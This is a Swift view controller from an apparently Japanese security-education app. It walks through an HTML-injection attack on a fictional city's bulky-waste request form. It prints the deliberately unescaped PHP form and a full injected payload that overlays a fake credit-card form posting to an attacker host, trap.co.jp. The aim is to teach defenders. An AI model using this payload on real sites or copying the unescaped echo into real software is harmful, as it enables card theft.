import UIKit

class FalsifyFormUnsafeWebSimulatorViewController: WebSimulatorViewController {
    
    let trapA = A()
    let div = Div()
    let oldTitleH1 = H1()
    let newTitleH1 = H1()
    let oldForm = Form()
    let oldNameText = Text()
    let oldNameInput = Input()
    let newForm = Form()
    let newNameText = Text()
    let newNameInput = Input()
    let numberText = Text()
    let numberInput = Input()
    let expirationText = Text()
    let expirationInput = Input()
    let applyButton = Button()
    let thankH1 = H1()
    let div2 = Div()
    let feedbackNameLabel = Text()
    let feedbackNameText = Text()
    let feedbackNumberLabel = Text()
    let feedbackNumberText = Text()
    let feedbackExpirationLabel = Text()
    let feedbackExpirationText = Text()
    
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupViews()
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        showTrap()
//        showApply()
//        showSendMail()
        
    }
    
    private func setupViews() {
        trapA.set(text: "脆弱市の粗大ゴミ回収費用がクレジットカードで支払えるようになりました!!これは便利です!!")
        trapA.set(code: "<input\n style=\"cursor:pointer;text-decoration:underline;color:blue;border:none;background:transparent;font-size:100%;\"\n type=\"submit\"\n value=\"脆弱市の粗大ゴミ改修費用がクレジットカードで支払えるようになりました!!これは便利です!!\"\n>", language: .html)
        trapA.button.addTarget(self, action: #selector(handleDisabledButton(_:)), for: .touchUpInside)
        oldTitleH1.set(text: "脆弱市 粗大ゴミ申し込みページ")
        newTitleH1.set(text: "脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。")
        div.set(code:"""
<h1>脆弱市 粗大ゴミ申し込みページ</h1>
<form method="post" action="confirm.php">
    氏名: <input type="text" name="name" value="<?php echo $_POST["name"]; ?>"><br>
    住所: <input type="text" name="address" value="<?php echo $_POST["address"]; ?>"><br>
    電話番号: <input type="number" name="tel" value="<?php echo $_POST["tel"]; ?>"><br>
    品目: <input type="text" name="item" value="<?php echo $_POST["item"]; ?>"><br>
    数量: <input type="number" name="num" value="<?php echo $_POST["num"]; ?>"><br>
    <input type="submit" value="申し込む">
</form>
""", language: .php, force: false)
        div.codeLabel.positionX = .right
        div.codeLabel.positionY = .top
        oldNameText.set(text: "氏名:")
        newForm.set(code: "<form method=\"post\" action=\"http://www.trap.co.jp/send_mail.php\"\n  style=\"position:absolute;top:5px;left:5px;background-color:white;\">\n    <h1>脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。</h1><br>\n    カード名義: <input type=\"text\" name=\"name\"><br><br>\n    カード番号: <input type=\"text\" name=\"card_number\"><br><br>\n    有効期限: <input type=\"text\"\n    name=\"expiration_date\"><br><br>\n    <input type=\"submit\" value=\"申し込む\">\n</form>", language: .html)
        newForm.codeLabel.positionX = .right
        newForm.codeLabel.positionY = .top
        newNameText.set(text: "カード名義:")
        numberText.set(text: "カード番号:")
        expirationText.set(text: "有効期限:")
        applyButton.set(text: "申し込む")
        applyButton.button.addTarget(self, action: #selector(handleDisabledButton(_:)), for: .touchUpInside)
        thankH1.set(text: "ご登録ありがとうございました。")
        thankH1.set(code: "<h1>ご登録ありがとうございました。</h1>", language: .html)
        div2.set(code: """
echo "カード名義: ", $name;
echo "<br>";
echo "カード番号: ", $card_number;
echo "<br>";
echo "有効期限: ", $expiration_date;
""", language: .php)
        feedbackNameLabel.set(text: "カード名義: ")
        feedbackNumberLabel.set(text: "カード番号: ")
        feedbackExpirationLabel.set(text: "有効期限: ")
    }
    
    private func showTrap() {
//        body.margin = UIEdgeInsets(top: 8, left: 8, bottom: 8, right: 8)
        body.clear()
        body.append(element: trapA)
        clearGuideSections()
        appendGuideSection([GuideText(text: "これが攻撃者が用意した罠サイトです。")])
        appendGuideSection([
            GuideText(text: "この赤枠で囲まれた<input>要素をタップすると脆弱なWebページに遷移します。", programingLanguages: [.html]),
            GuideText(text: "<input>要素の下に示したコードを見てください。\n本来は<input>要素なのでこのような見た目にはなりませんが、style属性で設定した値によって<a>要素のように見えています。\nこれによりユーザが罠に気付くのは困難になってしまっています。", programingLanguages: [.html]),
            GuideText(text: "この<input>要素をタップすることによって送信される値によって新たに追加される<form>要素を以下に示します。\n見切れている部分はスクロールすることで最後まで見ることが可能です。\n<form method=\"post\" action=\"send_mail.php\" style=\"position:absolute;top:5px;left:5px;background-color:white;\">\n    <h1>脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。</h1><br>\n    カード名義: <input type=\"text\" name=\"name\"><br><br>\n    カード番号: <input type=\"text\" name=\"card_number\"><br><br>\n    有効期限: <input type=\"text\" name=\"expiration_date\"><br><br>\n    <input type=\"submit\" value=\"申し込む\">\n</form>", programingLanguages: [.html])
            ],
                           onEnter: { completion in
                            self.focus(on: self.trapA) {
                                completion?()
                            }
        }, onExit: { completion in
            self.unfocus(elementView: self.trapA) {
                completion?()
            }
        })
        appendGuideSection([
            GuideText(text: "これを踏まえた上で実際に<input>要素をタップして、脆弱なWebページに遷移してみましょう", programingLanguages: [.html])
            ],
                           onEnter: { completion in
                            self.trapA.button.removeTarget(self, action: #selector(self.handleDisabledButton(_:)), for: .touchUpInside)
                            self.trapA.button.addTarget(self, action: #selector(self.handleEnabledTrapA(_:)), for: .touchUpInside)
                            completion?()
                            
        })
        removeCloseButton()
        guideMessageCollectionView.reloadData()
        guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
        showGuideMessageCollectionView()
    }
    
    private func showApply() {
        div.frame.size.width = body.safeAreaLayoutGuide.layoutFrame.width
        oldForm.frame.size.width = body.safeAreaLayoutGuide.layoutFrame.width
        newForm.frame.size.width = body.safeAreaLayoutGuide.layoutFrame.width
        body.clear()
        oldForm.append(element: oldNameText)
        oldForm.append(element: oldNameInput)
        div.append(element: oldTitleH1)
        div.append(element: oldForm)
        newForm.append(element: newTitleH1)
        newForm.append(element: newNameText)
        newForm.append(element: newNameInput)
        newForm.appendBreak()
        newForm.appendBreak()
        newForm.append(element: numberText)
        newForm.append(element: numberInput)
        newForm.appendBreak()
        newForm.appendBreak()
        newForm.append(element: expirationText)
        newForm.append(element: expirationInput)
        newForm.appendBreak()
        newForm.appendBreak()
        newForm.append(element: applyButton)
        body.append(element: div)
        body.seekToTop()
        body.append(element: newForm)
        clearGuideSections()
        appendGuideSection([
            GuideText(text: "これがHTMLの改ざんが行われた後の脆弱なWebページです。")
            ])
        appendGuideSection([
            GuideText(text: "この赤枠で囲まれた部分が攻撃者によって新たに追加された<form>要素です。", programingLanguages: [.html]),
            GuideText(text: "<form>要素の右横に示したコードと見比べてみましょう。\nこの<form>要素はユーザのクレジットカード情報を盗むために攻撃者が追加したものですが、本来このWebページは粗大ゴミの回収を申し込むためのページでした。", programingLanguages: [.html]),
            GuideText(text: "なぜ元々あった<form>要素が見えなくなっているのかというと、次に示したの設定により新たに追加された<form>要素が元々あった<form>要素を覆い隠すように配置され、さらに<body>要素と同じ背景色である白を設定することにより完全に塗り潰されてしまったためです。", programingLanguages: [.html]),
            GuideText(text: "style=\"position:absolute;top:5px;left:5px;background-color:white;\"", programingLanguages: [.php]),
            ],
                           onEnter: { completion in
                            self.focus(on: self.newForm) {
                                completion?()
                            }
        }, onExit: { completion in
            self.unfocus(elementView: self.newForm) {
                completion?()
            }
        })
        appendGuideSection([
            GuideText(text: "これを確認するために新たに追加された<form>要素を透明にしてみます。\n", programingLanguages: [.html]),
            GuideText(text: "新たに追加された<form>要素の下に元々あった<h1>要素と<form>要素が確認できます。\n赤枠の右側に示したコードと見比べてみましょう。", programingLanguages: [.html]),
            GuideText(text: "この赤枠の右側に示したコードの内、<form>要素に関する部分について解説していきます。", programingLanguages: [.html]),
            GuideText(text: "まず、コードと実際に表示されている内容を見比べると\n「氏名: <input type=\"text\" name=\"name\" value=\"<?php echo $_POST[\"name\"]; ?>\"><br>」\n以降の<input>要素が表示されていないのが確認できます。", force: false, programingLanguages: [.php]),
            GuideText(text: "これは攻撃者によってPOSTリクエトで渡されたnameの値によってHTMLの改ざんが行われたためです。\n今回nameパラメータに渡された値は次のものでした。"),
            GuideText(text: """
"></form>
<form method="post" action="http://www.trap.co.jp/send_mail.php" style="position:absolute;top:5px;left:5px;background-color:white;">
    <h1>脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。</h1><br>
    カード名義: <input type="text" name="name"><br><br>
    カード番号: <input type="text" name="card_number"><br><br>
    有効期限: <input type="text" name="expiration_date"><br><br>
    <input type="submit" value="申し込む">
</form>
<!--
"""),
            GuideText(text: """
この値が埋め込まれ、HTMLの改ざんが行われた後のコード全体は以下のようになります。
<h1>脆弱市 粗大ゴミ申し込みページ</h1>
<form method="post" action="confirm.php">
　　氏名: <input type="text" name="name" value=""></form>
<form method="post" action="http://www.trap.co.jp/send_mail.php" style="position:absolute;top:5px;left:5px;background-color:white;">
    <h1>脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。</h1><br>
    カード名義: <input type="text" name="name"><br><br>
    カード番号: <input type="text" name="card_number"><br><br>
    有効期限: <input type="text" name="expiration_date"><br><br>
    <input type="submit" value="申し込む">
</form>
<!--"><br>
    住所: <input type="text" name="address" value="<?php echo $_POST["address"]; ?>"><br>
    電話番号: <input type="number" name="tel" value="<?php echo $_POST["tel"]; ?>"><br>
    品目: <input type="text" name="item" value="<?php echo $_POST["item"]; ?>"><br>
    数量: <input type="number" name="num" value="<?php echo $_POST["num"]; ?>"><br>
    <input type="submit" value="申し込む">
</form>
""", programingLanguages: [.html]),
            GuideText(text: "ひとつずつ見ていきましょう。"),
            GuideText(text: "まずnameパラメータの最初の「\"></form>」に注目します。"),
            GuideText(text: """
これによって元々あった<form>要素が終了させられています。
<form method="post" action="confirm.php"
    氏名: <input type="text" name="name" value=""></form>
""", programingLanguages: [.html]),
            GuideText(text: """
次に、攻撃者が用意した<form>要素が元々あった<form>要素の上に重なるように配置されます。
<form method="post" action="http://www.trap.co.jp/send_mail.php" style="position:absolute;top:5px;left:5px;background-color:white;">
    <h1>脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。</h1><br>
    カード名義: <input type="text" name="name"><br><br>
    カード番号: <input type="text" name="card_number"><br><br>
    有効期限: <input type="text" name="expiration_date"><br><br>
    <input type="submit" value="申し込む">
</form>
""", programingLanguages: [.html]),
            GuideText(text: "そして最後の「<!--」によって、以降の攻撃者にとって不要な部分は全てコメントアウトされています。"),
            GuideText(text: """
<!--"><br>
    住所: <input type="text" name="address" value="<?php echo $_POST["address"]; ?>"><br>
    電話番号: <input type="number" name="tel" value="<?php echo $_POST["tel"]; ?>"><br>
    品目: <input type="text" name="item" value="<?php echo $_POST["item"]; ?>"><br>
    数量: <input type="number" name="num" value="<?php echo $_POST["num"]; ?>"><br>
    <input type="submit" value="申し込む">
</form>
""", programingLanguages: [.html]),
            GuideText(text: "以上のようにして、HTMLの改ざんが行われました。\n元々あった<form>要素の上に完全に重なるように新たな<form>要素が配置されてしまっているのでユーザが攻撃に気づくことは困難になってしまっています。", programingLanguages: [.html])
            ],
                           onEnter: { completion in
                            UIView.animate(withDuration: 1, animations: {
                                self.newForm.alpha = 0
                            }) { _ in
                                self.focus(on: self.div) {
                                    completion?()
                                }
                            }
        }, onExit: { completion in
            self.unfocus(elementView: self.div) {
                self.body.scrollView.sendSubviewToBack(self.div)
                UIView.animate(withDuration: 1, animations: {
                    self.newForm.alpha = 1
                }) { _ in
                    completion?()
                }
            }
        })
        appendGuideSection([
            GuideText(text: "透明になっていた<form>要素を元に戻します。", programingLanguages: [.html])
            ])
        appendGuideSection([
            GuideText(text: "それでは、実際に申し込むボタンを押して攻撃者にユーザのクレジットカード情報をメールで送信するページに遷移してみましょう。\n今回は各入力欄に空欄の場合はテスト用の値が入力されるようにしておきましたが、自由に値を設定しても構いません。")
            ], onEnter: { completion in
                self.setTestValue()
                self.applyButton.button.removeTarget(self, action: #selector(self.handleDisabledButton(_:)), for: .touchUpInside)
                self.applyButton.button.addTarget(self, action: #selector(self.handleApplyButton(_:)), for: .touchUpInside)
                completion?()
        }, onExit: { completion in
            completion?()
        })
        removeCloseButton()
        guideMessageCollectionView.reloadData()
        guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
        showGuideMessageCollectionView()
    }
    
    private func showSendMail() {
        feedbackNameText.set(text: newNameInput.textField.text ?? "名前")
        feedbackNumberText.set(text: numberInput.textField.text ?? "123456789")
        feedbackExpirationText.set(text: expirationInput.textField.text ?? "0000-00-00")
        body.clear()
        div2.frame.size.width = view.safeAreaLayoutGuide.layoutFrame.width
        div2.append(element: feedbackNameLabel)
        div2.append(element: feedbackNameText)
        div2.appendBreak()
        div2.append(element: feedbackNumberLabel)
        div2.append(element: feedbackNumberText)
        div2.appendBreak()
        div2.append(element: feedbackExpirationLabel)
        div2.append(element: feedbackExpirationText)
        body.append(element: thankH1)
        body.append(element: div2)
        clearGuideSections()
        appendGuideSection([
            GuideText(text: "これが攻撃者にユーザのクレジットカード情報をメールで送信するためのページです。"),
            GuideText(text: """
このページが読み込まれた時点で以下のコードが実行され、ユーザのクレジットカード情報がメールで送信されてしまいます。
$name = $_POST["name"];
$card_number = $_POST["card_number"];
$expiration_date = $_POST["expiration_date"];
function sendMail($name, $card_number, $expiration_date) {
    // ここで攻撃者にクレジットカード情報を送信します。
}
sendMail($name, $card_number, $expiration_date);
""", programingLanguages: [.php])
            ])
        appendGuideSection([
            GuideText(text: "ユーザが攻撃に気づかないように「ご登録ありがとうございました」という、いかにもそれらしい<h1>要素があります。", programingLanguages: [.html])
            ], onEnter: { completion in
                self.focus(on: self.thankH1) {
                    completion?()
                }
        }, onExit: { completion in
            self.unfocus(elementView: self.thankH1) {
                completion?()
            }
        })
        appendGuideSection([
            GuideText(text: "この赤枠で囲まれた部分は分かりやすさを狙って表示しているもので、実際に攻撃者がこのような情報を表示することはありません。")
            ], onEnter: { completion in
                self.focus(on: self.div2) {
                    completion?()
                }
        }, onExit: { completion in
            self.unfocus(elementView: self.div2) {
                completion?()
            }
        })
        appendGuideSection([
            GuideText(text: "以上、攻撃の流れを見てきましたがユーザのクレジットカード情報を盗まれてしまってはユーザが不利益を被ることになりますし、サイトへの信頼も失ってしまいますので早急に対策する必要があります。"),
            GuideText(text: "この攻撃への対策は同レッスンの対策編で解説していますのでそちらを参考にしてください。\nお疲れ様でした。")
            ])
        addCloseButton()
        guideMessageCollectionView.reloadData()
        guideMessageCollectionView.scrollToItem(at: IndexPath(item: 0, section: 0), at: .left, animated: false)
        showGuideMessageCollectionView()
    }
    
    private func setTestValue() {
        if self.newNameInput.textField.text == nil || self.newNameInput.textField.text!.isEmpty {
            self.newNameInput.textField.text = "名前"
        }
        if self.numberInput.textField.text == nil || self.numberInput.textField.text!.isEmpty {
            self.numberInput.textField.text = "123456789"
        }
        if self.expirationInput.textField.text == nil || self.expirationInput.textField.text!.isEmpty {
            self.expirationInput.textField.text = "0000-00-00"
        }
    }
    
    @objc
    private func handleEnabledTrapA(_ sender: UIButton) {
        hideGuideMessageCollectionView() {
            self.unfocusAll() {
                self.showApply()
            }
        }
    }
    
    @objc
    private func handleApplyButton(_ sender: UIButton) {
        hideGuideMessageCollectionView() {
            self.setTestValue()
            self.unfocusAll() {
                self.showSendMail()
            }
        }
    }
    
}
